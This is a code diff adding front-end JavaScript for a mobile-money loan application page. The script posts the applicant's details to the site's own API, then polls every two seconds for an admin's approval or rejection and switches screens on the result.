+            mtnNumber: document.getElementById('mtnNumber').value.trim(),
+            loanService: document.getElementById('loanService').value,
+            loanAmount: document.getElementById('loanAmount').value,
+            repaymentPeriod: document.getElementById('repaymentPeriod').value
+        };
+
+        try {
+            const response = await fetch('/api/loans/apply', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const data = await response.json();
+
+            if (!response.ok) {
+                throw new Error(data.message || 'Could not submit loan application.');
+            }
+
+            // Save application ID and populate Summary Screen fields
+            activeApplicationId = data.applicationId;
+            document.getElementById('sumName').textContent = payload.fullName;
+            document.getElementById('sumPhone').textContent = payload.mtnNumber;
+            document.getElementById('sumService').textContent = payload.loanService;
+            document.getElementById('sumAmount').textContent = payload.loanAmount;
+            document.getElementById('sumPeriod').textContent = payload.repaymentPeriod;
+
+            // Transition to Screen 3 and spin infinitely until Admin approves or declines
+            document.getElementById('liveStatusText').textContent = `Ref: ${activeApplicationId} • Waiting for admin...`;
+            switchPage('page3');
+            pollApprovalStatus(activeApplicationId);
+
+        } catch (error) {
+            alert('Submission Error: ' + error.message);
+        } finally {
+            btn.innerHTML = originalText;
+            btn.disabled = false;
+        }
+    }
+
+    // Poll Backend API every 2 seconds; spinner runs nonstop until APPROVED or REJECTED
+    function pollApprovalStatus(applicationId) {
+        if (pollTimer) {
+            clearInterval(pollTimer);
+        }
+
+        pollTimer = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/loans/status/${encodeURIComponent(applicationId)}`, {
+                    cache: 'no-store'
+                });
+
+                if (!res.ok) {
+                    return;
+                }
+
+                const data = await res.json();
+
+                if (data.status === 'APPROVED') {
+                    clearInterval(pollTimer);
+                    pollTimer = null;
+                    switchPage('page4');
+                } else if (data.status === 'REJECTED') {
+                    clearInterval(pollTimer);
+                    pollTimer = null;
+                    alert('Your loan application was declined by the admin team. Please contact WhatsApp support for assistance.');
+                    resetAndReturnHome();
+                }
+            } catch (err) {
+                // Keep spinning and retrying if connection briefly drops
+                console.error('Polling status...', err);
+            }
+        }, 2000);
+    }
+</script>
+</body>
+</html>
 
